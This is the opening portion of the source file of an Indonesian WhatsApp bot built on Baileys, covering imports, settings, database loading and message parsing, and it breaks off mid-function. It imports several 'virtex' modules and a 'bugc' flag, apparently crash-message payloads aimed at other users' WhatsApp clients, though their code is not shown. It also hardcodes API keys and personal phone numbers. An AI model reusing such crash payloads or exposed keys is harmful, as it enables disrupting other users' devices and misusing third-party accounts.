// 𝙏𝙏𝘿 𝘼𝙇𝙇 𝘾𝙍𝙀𝘼𝙏𝙊𝙍 𝘽𝙊𝙏
//if (!isRegistered && !itsMe && !isOwner)return reply(mess.only.group)
const {
  WAConnection: _WAConnection,
  MessageType,
  Presence,
  MessageOptions,
  Mimetype,
  MimetypeMap,
  WALocationMessage,
  ChatModification,
  WA_MESSAGE_STUB_TYPES,
  WA_DEFAULT_EPHEMERAL,
  ReclientectMode,
  ProxyAgent,
  GroupSettingChange,
  waChatKey,
  mentionedJid,
  processTime,
} = require("@adiwajshing/baileys");
const simple = require("./lib/simple.js");
const { virtex, vipi } = require("./lib/virtex.js"); 
const { Toxic } = require('./lib/Toxic.js')
const hx = require("hxz-api");
const qrcode = require("qrcode-terminal");
const moment = require("moment-timezone");
const speed = require("performance-now");
const request = require("request");
const { spawn, exec, execSync } = require("child_process");
const fs = require("fs");
const axios = require("axios");
const ffmpeg = require("fluent-ffmpeg");
const { EmojiAPI } = require("emoji-api");
const ig = require("insta-fetcher");
const emoji = new EmojiAPI();
const fetch = require("node-fetch");
const FormData = require("form-data");
const phoneNum = require("awesome-phonenumber");
const gis = require("g-i-s");
const got = require("got");
const imageToBase64 = require("image-to-base64");
const ID3Writer = require("browser-id3-writer");
const crypto = require('crypto')
const googleImage = require('g-i-s')
const brainly = require("brainly-scraper");
const xa = require('xfarr-api');
const yts = require("yt-search");
const ms = require("parse-ms");
const os = require('os');
const toMs = require("ms");
const imgbb = require("imgbb-uploader");
const { error } = require("qrcode-terminal");
const {
  getBuffer,
  h2k,
  generateMessageID,
  getGroupAdmins,
  getRandom,
  banner,
  start,
  info,
  success,
  close,
} = require("./lib/functions");
const { color, bgcolor } = require("./lib/color");
const { virtex90 } = require('./virtex/virtex90')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { virtex4 } = require('./virtex/virtex4')
const { virtex5 } = require('./virtex/virtex5')
const { virtex6 } = require('./virtex/virtex6')
const { virtex7 } = require('./virtex/virtex7')
const { virtex8 } = require('./virtex/virtex8')
const { virtex9 } = require('./virtex/virtex9')
const { ngazap } = require('./virtex/ngazap')
const { virtag } = require('./virtex/virtag')
const { emoji2 } = require('./virtex/emoji2')
const { menunya } = require('./database/menu')
const { fbdl } = require('./lib/fbdl')
const { wikiSearch } = require('./lib/wiki.js')
const { mediafireDl } = require('./lib/mediafire.js')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const { fetchJson, getBase64, kyun, createExif } = require("./lib/fetcher");
const { yta, ytv, igdl, upload, formatDate } = require("./lib/ytdl");
const { webp2mp4File } = require("./lib/webp2mp4");
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const afk = JSON.parse(fs.readFileSync("./lib/off.json"));
const { sleep, isAfk, cekafk, addafk } = require("./lib/offline");
const { cmdadd } = require("./lib/totalcmd.js");
const voting = JSON.parse(fs.readFileSync("./lib/voting.json"));
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { uptotele, uploadFile, RESTfulAPI, uploadImages } = require('./lib/uploadimage');
const { addVote, delVote } = require("./lib/vote");
const reminder = require("./lib/reminder");
const { jadibot, stopjadibot, listjadibot } = require("./lib/jadibot");
const bad = JSON.parse(fs.readFileSync('./database/bad.json'))
const vien = JSON.parse(fs.readFileSync('./database/vien.json'))
const aefka = JSON.parse(fs.readFileSync('./database/afk.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const bucinrandom = JSON.parse(fs.readFileSync('./database/bucin.json'))
const _reminder = JSON.parse(fs.readFileSync("./database/reminder.json"));
let _registered = JSON.parse(fs.readFileSync('./database/user/registered.json'))
let register = JSON.parse(fs.readFileSync('./database/user/registered.json'))
let fakeimage = fs.readFileSync("./media/thumb.jpeg")
let fakethumb = fs.readFileSync('./media/donasi.jpg')
const truth = JSON.parse(fs.readFileSync('./database/truth.json'))
const dare = JSON.parse(fs.readFileSync('./database/dare.json'))
virgam = fs.readFileSync(`./media/virgam.jpeg`)
fakethumb = fs.readFileSync('./media/donasi.jpg')
fakeimage = fs.readFileSync("./media/thumb.jpeg")
fakegim = fs.readFileSync('./media/donasi.jpg')
fakedown = fs.readFileSync('./media/download.jpg')
fakeker = fs.readFileSync('./media/kerang.jpg')
fakebil = fs.readFileSync('./media/baileys.jpg')
fakele = fs.readFileSync('./media/about.jpg')
fakelol = fs.readFileSync('./media/grup.jpg')
fakeown = fs.readFileSync('./media/own.jpg')
fakewibu = fs.readFileSync('./media/wibu.jpg')
fakeup = fs.readFileSync('./media/up.jpg')
fakemenu = fs.readFileSync('./media/menuall.jpg')
fakeote = fs.readFileSync('./media/other.jpg')
fakemeki = fs.readFileSync('./media/maker.jpg')
fakejem = fs.readFileSync('./media/tol.jpg')
fakepeler = fs.readFileSync('./media/tolol.jpg')
fakedatabase = fs.readFileSync('./media/data.jpg')
fakeoxy = fs.readFileSync('./media/oxiy.jpg')
fakegeming = fs.readFileSync('./media/game.jpg')
faketiktok = fs.readFileSync('./media/tiktok.jpg')
fakerules = fs.readFileSync('./media/rules.jpg')
// GAME
let tebakanime = JSON.parse(fs.readFileSync('./database/tebakanime.json'))
let tebakgambar = JSON.parse(fs.readFileSync('./database/tebakgambar.json'))
let asahotak = JSON.parse(fs.readFileSync('./database/asahotak.json'))
let caklontong = JSON.parse(fs.readFileSync('./database/caklontong.json'))
let tebaksiapaaku = JSON.parse(fs.readFileSync('./database/tebaksiapaaku.json'))
let tebakbendera = JSON.parse(fs.readFileSync('./database/tebakbendera.json'))
let susunkata = JSON.parse(fs.readFileSync('./database/susunkata.json'))
let tebakata = JSON.parse(fs.readFileSync('./database/tebakata.json'))
let tebaklirik = JSON.parse(fs.readFileSync('./database/tebaklirik.json'))
let tebakjenaka = JSON.parse(fs.readFileSync('./database/tebakjenaka.json'))
let tebakimia = JSON.parse(fs.readFileSync('./database/tebakimia.json'))
let kuismath = JSON.parse(fs.readFileSync('./database/kuismath.json'))
let tebaklagu = JSON.parse(fs.readFileSync('./database/tebaklagu.json'))
let tebaktebakan = JSON.parse(fs.readFileSync('./database/tebaktebakan.json'))
let limit = JSON.parse(fs.readFileSync('./database/limit.json'))
let glimit = JSON.parse(fs.readFileSync('./database/glimit.json'))
let _leveling = JSON.parse(fs.readFileSync('./database/leveling.json'))
let balance = JSON.parse(fs.readFileSync('./database/balance.json'));
let family100 = [];
// BATAS IMAGE FOLDER //
const iye = fs.readFileSync('./media/thumb.jpeg')
const asw1 = 'https://f.top4top.io/p_2073p4mwa0.jpg'
const sip = fs.readFileSync('./media/oksip.jpeg')
const bgg = fs.readFileSync('./media/fake.jpeg')
const bgbot = 'https://i.ibb.co/Rpdfnwh/images-q-tbn-ANd9-Gc-Tmn-q-Sq-E0m-Fr-QUEpar-Wd-L-GK5u-Rb-M9661-Xw-usqp-CAU.jpg'
//// Image ///
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (time2 < "24:59:00") {
      var ucapanWaktu = "Selamat malam🌃";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Selamat senja🌞";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "Selamat sore🌄";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "Selamat siang☀️";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Selamat pagi🌅";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Selamat malam🌃";
    }
 // BATAS \\
menusimpel = false
menuall = false
antitrol = true
bugc = false
banChats = false;
offline = false;
antidel = false;
welcom = false;
antical = false
readGc = true; 
readPc = true;
autovn = false;
multi = true
harga = 0
matauang = 'USD'
nopref = false
numbernye = '0'
autoketik = false;
prefixStatus = true;
waktuafk = 'Nothing'
alasanafk = 'Nothing'
limitCount = 20,
healtawal = 100
potionawal = 1
targetpc = "+6289503655664"; 
owner = "+6289503655664";
nandoku = "+6289503655664";
fakeyoi = "Jaar Bot";
hai = "Jaar Bot";
AlphaBot = "Alphabot",
HunterApi = "FuckBitch",
xchillds = 'XChillDs' 
hardi = "hardianto",
valkey = "rivalgans", 
zeksapi = "vallganz5",
dapapi = "anakasu",
ApiZeks = "https://api.zeks.me",
zeksApikey = "Alphabott",
lolkey = "nandolovealya",
melkey = "alyawangy",
zekskey = "NinoWangy",
dhakey = "NisaaCantik",
nomorowner1 = "6289503655664"; 
fake = `DEVLOPED BY: ${fakeyoi}\nINCLUDES: ${prefixStatus ? "Multi Prefix" : "No Prefix"} 」`;
thumb = fs.readFileSync("./media/thumb.jpeg"); 
numbernye = "0"; 
waktu = "-";
alasan = "-"; 
autojoin = false;
cmhit = []
hit_today = [];
//===============//
let _scommand = JSON.parse(fs.readFileSync("./database/scommand.json"));
let { checkPetualangUser, addInventori, addBesi, sellBesi, getBesi, addDm, sellDm, getDm, addEmas, sellEmas, getEmas, addFish, sellFish, getFish } = require("./lib/rpgfunction");
let { addLevelingId, addLevelingLevel, addLevelingXp, getLevelingId, getLevelingLevel, getLevelingXp } = require("./lib/lvlfunction");

let _RPG = JSON.parse(fs.readFileSync('./lib/inventori.json'))
let _level = JSON.parse(fs.readFileSync('./lib/leveluser.json'))
let _petualang = JSON.parse(fs.readFileSync('./lib//inventori.json'))
let _healt = JSON.parse(fs.readFileSync('./lib/healt.json'))
//premoum
const getPremiumExpired = (sender) => {

		    let position = null
		    Object.keys(prem).forEach((i) => {
		        if (prem[i].id === sender) {
		            position = i
		        }
		    })
		    if (position !== null) {
		        return prem[position].expired
		    }
		} 
		
		const expiredCheck = () => {
		    setInterval(() => {
		        let position = null
		        Object.keys(prem).forEach((i) => {
		            if (Date.now() >= prem[i].expired) {
		                position = i
		            }
		        })
		        if (position !== null) {
		            console.log(`Premium expired: ${prem[position].id}`)
		            prem.splice(position, 1)
		            fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
		             }
		    }, 1000)
		} 
		
		const getAllPremiumUser = () => {
		    const array = []
		    Object.keys(prem).forEach((i) => {
		        array.push(prem[i].id)
		    })
		    return array
		}		
const xpGain = new Set()
const isGained = (userId) => {
    return !!xpGain.has(userId)
}
const addCooldown = (userId) => {
    xpGain.add(userId)
    setTimeout(() => {
        return xpGain.delete(userId)
    }, 60000)
}
//Batas

// 𝗙𝘂𝗻𝗰𝗮𝘁𝗶𝗼𝗻 𝗦𝘁𝗶𝗰𝗸𝗲𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 シ︎
const addCmd = (id, command) => {
  const obj = { id: id, chats: command };
  _scommand.push(obj);
  fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
};
const getCommandPosition = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return position;
  }
};

const getCmd = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return _scommand[position].chats;
  }
};

const checkSCommand = (id) => {
  let status = false;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      status = true;
    }
  });
  return status;
};			
function randomNomor(min, max = null) {
		  if (max !== null) {
			min = Math.ceil(min);
			max = Math.floor(max);
			return Math.floor(Math.random() * (max - min + 1)) + min;
		  } else {
			return Math.floor(Math.random() * min) + 1
		  }
		}
function monospace(string) {
return '```' + string + '```'
}   
const runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);  
  var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};
module.exports = itsmevall = async (itsmevall, mek) => {
  try {
    if (!mek.hasNewMessage) return;
    mek = mek.messages.all()[0];
    if (!mek.message) return;
    if (mek.key && mek.key.remoteJid == "status@broadcast") return;
    global.blocked;
    mek.message =
      Object.keys(mek.message)[0] === "ephemeralMessage"
        ? mek.message.ephemeralMessage.message
        : mek.message;
const typei = Object.keys(mek.message)[0]
const type = Object.keys(mek.message)[0]
let _chats =
      type === "conversation" && mek.message.conversation
        ? mek.message.conversation
        : type == "imageMessage" && mek.message.imageMessage.caption
        ? mek.message.imageMessage.caption
        : type == "videoMessage" && mek.message.videoMessage.caption
        ? mek.message.videoMessage.caption
        : type == "extendedTextMessage" && mek.message.extendedTextMessage.text
        ? mek.message.extendedTextMessage.text
        : type == "buttonsResponseMessage" && mek.message[type].selectedButtonId
        ? mek.message[type].selectedButtonId
        : type == "stickerMessage" &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== null &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== undefined
        ? getCmd(mek.message[type].fileSha256.toString("base64"))
        : "";
const isImage = (type === 'imageMessage')
const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
if (multi){
		    var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
        } else {
            if (nopref){
                prefix = ''
            } else {
                prefix = prefa
            }
        }
    const content = JSON.stringify(mek.message);
    const from = mek.key.remoteJid;
    const {
      text,
      extendedText,
      contact,
      location,
      contactsArray,
      liveLocation,
      image,
      video,
      sticker,
      document,
      audio,
      product,
    } = MessageType;
const body = (type === 'listResponseMessage' && mek.message.listResponseMessage.title) ? mek.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budo = (typei === 'conversation') ? mek.message.conversation : (typei === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
    const q = args.join(" ");
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
    const botNumber = itsmevall.user.jid;
    
    const botNumberss = itsmevall.user.jid + "@c.us";
    const isGroup = from.endsWith("@g.us");

    const antilink = JSON.parse(fs.readFileSync("./database/antilink.json"));
    const antivirtex = JSON.parse(
      fs.readFileSync("./database/antivirtex.json")
    );
    
    const kickarea = JSON.parse(fs.readFileSync("./database/antibule.json"));
    const nsfww = JSON.parse(fs.readFileSync('./database/nsfww.json'))
    const bancht = JSON.parse(fs.readFileSync('./database/banchat.json'));
    const antivo = JSON.parse(fs.readFileSync("./database/antivo.json"));
    const antihidetg = JSON.parse(
      fs.readFileSync("./database/antihidetag.json")
    );
    const isAntihidetag = isGroup ? antihidetg.includes(from) : false;
    const isAntiviewonce = isGroup ? antivo.includes(from) : false;
    const isKickarea = isGroup ? kickarea.includes(from) : false;
    const isNsfw = isGroup ? nsfww.includes(from) : false
    const isAntivirtex = isGroup ? antivirtex.includes(from) : false;
    const isAntilink = isGroup ? antilink.includes(from) : false;
// 𝘼𝙪𝙩𝙤 𝙍𝙚𝙖𝙙 𝙂𝙘
var ampun = await itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
ampun.map( async ({ jid }) => {
if (readGc === false) return
await itsmevall.chatRead(jid)
})
// 𝘼𝙪𝙩𝙤 𝙍𝙚𝙖𝙙 𝙋𝙘
var chatss = await itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readPc === false) return
await itsmevall.chatRead(jid)
})
// 𝘼𝙪𝙩𝙤 𝙑𝙣:𝙫
if (autovn) {
	if (autovn === false) return
await itsmevall.updatePresence(from, Presence.recording)
} else if (autoketik) {
	if (autoketik === false) return
await itsmevall.updatePresence(from, Presence.composing)
}
const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }
const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }        
    const sender = mek.key.fromMe
      ? itsmevall.user.jid
      : isGroup
      ? mek.participant
      : mek.key.remoteJid;
    let senderr = mek.key.fromMe
      ? itsmevall.user.jid
      : mek.key.remoteJid.endsWith("@g.us")
      ? mek.participant
      : mek.key.remoteJid;
    const totalchat = await itsmevall.chats.all();
    const ownerNumber = [`6289503657396@s.whatsapp.net`]
	const senderNumber = sender.split("@")[0] 
    const m = simple.smsg(itsmevall, mek);
    const groupMetadata = isGroup ? await itsmevall.groupMetadata(from) : "";
    const groupName = isGroup ? groupMetadata.subject : "";
    const groupId = isGroup ? groupMetadata.jid : "";
    const itsMe = mek.key.fromMe ? true : false
    const isRegistered = checkRegisteredUser(sender)    
   const isRegister = register.includes(sender)    
    const groupMembers = isGroup ? groupMetadata.participants : "";
    const groupDesc = isGroup ? groupMetadata.desc : "";
    const isOwner = ownerNumber.includes(sender)
    const isBanned = ban.includes(sender)
    const isPetualang = checkPetualangUser(sender)
    const isPremium= prem.includes(sender)    
    const groupOwner = isGroup ? groupMetadata.owner : "";
    const hour_now = moment().format('HH:mm:ss')    
    const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : "";
    const isBotGroupAdmins = groupAdmins.includes(botNumber) || false;
    const isGroupAdmins = groupAdmins.includes(sender) || false;
    const isBanchat = isGroup ? bancht.includes(from) : false
    const isVote = isGroup ? voting.includes(from) : false;
    const isLevelingOn = isGroup ? _leveling.includes(from) : false
    const conts = mek.key.fromMe    
      ? itsmevall.user.jid
      : itsmevall.contacts[sender] || { notify: jid.replace(/@.+/, "") };
    const pushname = mek.key.fromMe
      ? itsmevall.user.name
      : conts.notify || conts.vname || conts.name || "-";
    const readmore = "͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏";
    if (prefix && command) cmdadd();
    const totalhit = JSON.parse(fs.readFileSync("./lib/totalcmd.json"))[0]
      .totalcmd;      
		try {
		pporang = await itsmevall.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
		pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		      }
		const ofrply = await getBuffer(pporang)
		const sekarang = new Date().getTime();
		//F
const daftar1 = `*Hi ${pushname}* 👋\n*Daftar dulu ya*`
const daftar2 = '_KLIK BUTTON INI UNTUK DAFTAR_'
const daftar3 = [{buttonId: `verify`,buttonText: {displayText: `Daftar`,},type: 1,},]

var hayuk0 = 'TIDAK TERVERIFIKASI'
			if (isRegistered) {
			hayuk0 = 'VERIFIKASI✔️'
			}
    //Y
const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWita = moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWit = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
    const time = moment.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
    const jam = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    const wita = moment.tz("Asia/Makassar").format("HH:mm:ss");
    const wit = moment.tz("Asia/Jayapura").format("HH:mm:ss");
    let locale = "id";
    let d = new Date();
    let gmt = new Date(0).getTime() - new Date("1 January 1970").getTime();
    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
      Math.floor((d * 1 + gmt) / 84600000) % 5
    ];
    let date = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let waktu = d.toLocaleDateString(locale, {
      hour: "numeric",
      minute: "numeric",
      second: "numeric",
    });
cmhit.push(command)
    //MESS
    mess = {
      wait: "*[Wait] Tunggu Sebentar..*",
      success: "_SUKSES!!_",
      prem: "_PERINTAH INI HANYA DAPAT DIGUNAKAN OLEH USER PREMIUM, SILAHKAN MEMBELI AKSES PREMIUM KE OWNER😁!_",
      ban: "Kamu Telah Di Ban Oleh Owner, silahkan chat owner untuk minta di unban",
      wrongFormat: "Format salah, coba lagi di menu",      
      error: {
        stick: "bukan stiker itu:v",
        apiz: "Tulisan Jan adalah singkatan dari Error",
        Iv: "_LINK YANG KAKAK BERIKAN ERROR:(_",
      },
      only: {
        group: "_Perintah Ini Hanya Bisa Digunakan Oleh Admin Grup kak_",
        player: `Maaff kak ${pushname} sepertinya kakak bukan petualang!!\nUntuk menjadi petualang silahkan ketik :\n${prefix}joinrpg`,	
      },
    };

    const isUrl = (url) => {
      return url.match(
        new RegExp(
          /https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/,
          "gi"
        )
      );
    };
  /*const reply = (teks) => {    

      itsmevall.sendMessage(from, teks, text, { quoted: mek });
    };*/
    const textImg = (teks) => {
           return itsmevall.sendMessage(from, teks, text, {quoted: freply, thumbnail: fs.readFileSync('./itsmevall.jpg')})
        }
const math = (teks) => {
           return Math.floor(teks)
       }
/*const reply = (teks) => {
			itsmevall.sendMessage(from, teks, text, { thumbnail: iye, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jam} - ${week} ${weton} - ${date}`,body:"",previewType:"PHOTO",thumbnail:iye,sourceUrl:`https://wa.me/62858157008612?text=Assalamualaikum`}}})
		}*/
    const sendMess = (hehe, teks) => {
      itsmevall.sendMessage(hehe, teks, text);
    };

    const mentions = (teks, memberr, id) => {
      id == null || id == undefined || id == false
        ? itsmevall.sendMessage(from, teks.trim(), extendedText, {
            contextInfo: { mentionedJid: memberr },
          })
